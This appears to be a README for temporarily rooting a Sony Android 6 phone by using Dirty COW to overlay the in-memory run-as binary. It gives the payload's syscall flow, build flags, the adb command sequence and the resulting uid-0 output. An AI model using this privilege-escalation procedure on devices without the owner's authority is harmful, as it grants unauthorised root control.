# Temporary root payload

## Premise

On `34.1.B.0.336`, `/system/bin/run-as` carries the `runas_exec` SELinux
label. Executing that path transitions the process into the `runas` domain,
which is allowed `CAP_SETUID` and `CAP_SETGID`. Dirty COW
(CVE-2016-5195) lets a process write into the private page-cache mapping of a
read-only file it can only read, without modifying the underlying block
device. Combine the two: replace the *in-memory image* of `run-as` with a
payload that escalates to uid 0.

Nothing is written to `/system` on disk. `dm-verity` stays satisfied, and a
reboot restores the stock `run-as`.

## Payload flow

`src/rootshell.c` is a freestanding aarch64 `ET_EXEC`, pure syscalls, no libc,
no dynamic linker, no `.bss`:

1. `capset` — set `CAP_SETUID | CAP_SETGID` in effective/permitted
   (`_LINUX_CAPABILITY_VERSION_3 = 0x20080522`).
2. `setgroups(0, NULL)`, `setresgid(0,0,0)`, `setresuid(0,0,0)`.
3. `setcon` — write a context string to `/proc/self/attr/current`. The
   `runas` domain is denied `setenforce` and `execute` of `shell_exec`, so the
   payload tries a list of contexts, most privileged first, and stops at the
   first one the policy allows. On this device the working one is
   `u:r:shell:s0`; `platform_app` also works.
4. Print `uid`/`euid` and the chosen context, then `execve("/system/bin/sh")`
   reading commands from stdin.

`src/rootproof.c` is a smaller variant that only prints credentials — useful
to prove escalation before attempting exec.

### arm64 syscall numbers used

| Call | NR |
|---|---|
| `openat` | 56 |
| `close` | 57 |
| `write` | 64 |
| `capset` | 91 |
| `exit` | 93 |
| `setresuid` | 147 |
| `setresgid` | 149 |
| `setgroups` | 159 |
| `getpid` | 172 |
| `getuid` / `geteuid` / `getgid` / `getegid` | 174 / 175 / 176 / 177 |
| `execve` | 221 |

Get them from `/usr/include/asm-generic/unistd.h`; using x86 numbers
(`getresuid=118`) produces wrong results.

## Build

```sh
gcc -O2 -Wall -ffreestanding -fno-builtin \
    -no-pie -nostdlib -static -Wl,-z,max-page-size=4096 \
    -o rootshell src/rootshell.c
```

Three details are essential:

- `-ffreestanding -fno-builtin` — otherwise GCC turns the string-length loop
  into a `strlen` call and linking fails with `undefined reference to strlen`.
- `-nostdlib -static` — no bionic dependency.
- **No `.bss`** — keep all state on the stack. Android 6 mishandles a
  `NOBITS` LOAD segment with `FileSiz=0`; a static global array causes an
  immediate `SIGSEGV`. Verify with `readelf -SW rootshell | grep .bss`.

## Apply

`scripts/temp-root.sh` drives the whole thing. The critical detail:
**reboot before each overlay.** `dirtycow`'s `copyErrors()` self-check silently
declares success if the page cache already holds a previous payload, so a
second overlay without a reboot does nothing — the old payload keeps running.

```sh
adb push dirtycow /data/local/tmp/dirtycow
adb push rootshell /data/local/tmp/rootshell
adb shell 'chmod 755 /data/local/tmp/{dirtycow,rootshell}'
adb shell 'cd /data/local/tmp && ./dirtycow /system/bin/run-as ./rootshell'
printf 'id\ngetprop ro.build.display.id\nexit\n' | adb shell /system/bin/run-as
```

`dirtycow` here is the well-known 64-bit build from the BackupTA / Flashtool
projects. Recompile it from upstream source rather than trusting a random
prebuilt binary.

## Observed results

```
uid=0 euid=0 ctx_index=5 ctx=u:r:shell:s0
uid=0(root) gid=0(root) groups=0(root) context=u:r:shell:s0
34.1.B.0.336
6.0.1
```

`/proc/self/status` confirms `Uid: 0 0 0 0`, `Gid: 0 0 0 0`,
`CapEff: 00000000000000c0`.

## What this root can and cannot do

Can: run commands as uid 0, read root-readable proc/sysfs entries, drive
`adb shell` through the escalated shell.

Cannot (SELinux still Enforcing, capability set limited):

- `setenforce 0` — `avc: denied { setenforce } for scontext=u:r:runas:s0`
- write `shell_data_file` — `touch /data/local/tmp/x` → permission denied
- read raw block devices — `dd if=/dev/block/.../TA` → permission denied
- exec `shell_exec` from the `runas` domain without first switching context

The earlier `backupTA.sh` chain (Flashtool's `dirtycow` + `exploitta` +
`dumpta`) failed on this firmware with `Illegal instruction (core dumped)`
and a zero-byte TA dump — it depends on the Sony `tad` service and is
unnecessary when only root is wanted. Since the bootloader was never
unlocked and no `.ta` was flashed, the TA/DRM keys were never at risk, so a
TA backup is not a prerequisite here.
